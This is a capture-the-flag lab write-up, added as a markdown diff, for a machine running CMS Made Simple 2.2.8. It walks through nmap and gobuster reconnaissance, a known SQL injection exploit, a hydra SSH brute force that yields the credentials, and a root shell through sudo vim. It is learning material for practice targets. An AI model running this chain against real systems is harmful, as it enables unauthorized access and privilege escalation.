@@ -1,0 +1,71 @@
+# IP Address 
+
+10.10.76.103
+
+# OPEN PORTS
+
+21/tcp   open  ftp
+80/tcp   open  http
+2222/tcp open  ssh
+
+# TASKS:
+
+# 1. Find the service that runs under port 1000: we can find this buy using nmap with proper syntax and save it to a file. 
+
+nmap -sV -sS -T4 -p- -vv 10.10.176.252 -oN portscan.txt
+
+# 2. What is running under the higher port: 
+
+SSH
+
+# 3 & 4: What's the CVE you're using against the application? We know that on PORT 80 there is an http web server. we can try to use gobuster and see what other directories are accesible. 
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.176.252 -o gobusterscan.txt
+
+- it looks like /simple -> lets head to that url and figure what the site is being powered by and see if we can find any known exploits in either 'searchsploit' or 'Exploit-DB'
+
+It appears : This site is powered by CMS Made Simple version 2.2.8
+
+Searching on 'searchsploit'
+
+CMS Made Simple < 2.2.10 - SQL Injectio | php/webapps/46635.py
+
+Exploit DB: https://www.exploit-db.com/exploits/46635
+
+We can use the python script and exploit the machine to figure out what the password is for the ssh. 
+
+We also did an ftp for the server on port 21 and found a .txt file called 'ForMitch.txt' we can assume that 'Mitch' is the username. 
+
+Since we now the username, we can now bruteforcing our way through using 'hydra' there is open SSH on PORT 2222, since in the ForMitch.txt file stated there was a weak password.
+
+# Option 1 w/Hydra
+
+hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://[IP]:2222
+
+USER: mitch
+PASS: secret
+
+[DATA] attacking ssh://10.10.76.103:2222/
+[2222][ssh] host: 10.10.76.103   login: mitch   password: secret
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-27 18:29:53
+
+Once founded SSH into the computer and look around.
+
+# Option 2 w/ exploit 
+
+python2 cmsexploit.py -u http://[IP]/simple --crack -w /usr/share/wordlists/rockyou.txt
+
+Now we want to SSH again and find a Path to Root.
+
+sudo -l -> checks priv esc is the sudo rights of the user.
+
+sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+We see that we can run 'vim' as sudo to get root.
+
+We can go to GTFOBins: https://gtfobins.github.io/ -> vim -> Sudo
+
+sudo vim -c ':!/bin/sh'
